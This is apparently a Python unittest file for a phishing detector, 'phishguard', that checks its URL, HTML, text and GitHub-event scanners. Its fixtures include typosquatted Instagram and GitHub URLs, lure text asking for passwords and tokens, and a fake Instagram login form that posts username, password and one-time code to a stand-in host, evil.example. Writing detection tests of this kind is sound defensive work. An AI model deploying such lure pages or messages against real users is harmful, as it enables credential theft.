from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from phishguard.github import scan_github_event
from phishguard.scanner import extract_urls, scan_html, scan_text, scan_url


class PhishGuardTests(unittest.TestCase):
    def test_brand_impersonation_url(self) -> None:
        result = scan_url("https://instagrarn-security-check.xyz/login/verify-account")
        self.assertEqual(result.risk, "dangerous")
        self.assertEqual(result.category, "brand_impersonation")
        self.assertEqual(result.brand, "Instagram")

    def test_fake_social_login_html(self) -> None:
        html = """
        <html>
          <head><title>Instagram Security Alert</title></head>
          <body>
            <h1>Instagram verify account</h1>
            <form action="https://evil.example/collect">
              <input name="username">
              <input type="password" name="password">
              <input name="otp">
            </form>
          </body>
        </html>
        """
        result = scan_html(html, page_url="https://instagrarn-help.example/login")
        self.assertEqual(result.risk, "dangerous")
        self.assertEqual(result.category, "fake_social_login")
        self.assertEqual(result.brand, "Instagram")

    def test_extract_urls(self) -> None:
        urls = extract_urls("Check https://example.com/a and www.github.com now")
        self.assertEqual(urls, ["https://example.com/a", "https://www.github.com"])

    def test_text_scan_combines_credential_and_url(self) -> None:
        result = scan_text("Urgent action required. Verify your password at https://github-security-login.xyz")
        self.assertIn(result.risk, {"suspicious", "dangerous"})
        self.assertTrue(result.evidence)

    def test_github_event_scan(self) -> None:
        with TemporaryDirectory() as tmp:
            path = Path(tmp) / "event.json"
            path.write_text(
                '{"issue":{"title":"help","body":"Verify GitHub token at https://github-login-security.xyz"}}',
                encoding="utf-8",
            )
            result = scan_github_event(path)
        self.assertEqual(result.risk, "dangerous")
        self.assertEqual(result.brand, "GitHub")


if __name__ == "__main__":
    unittest.main()

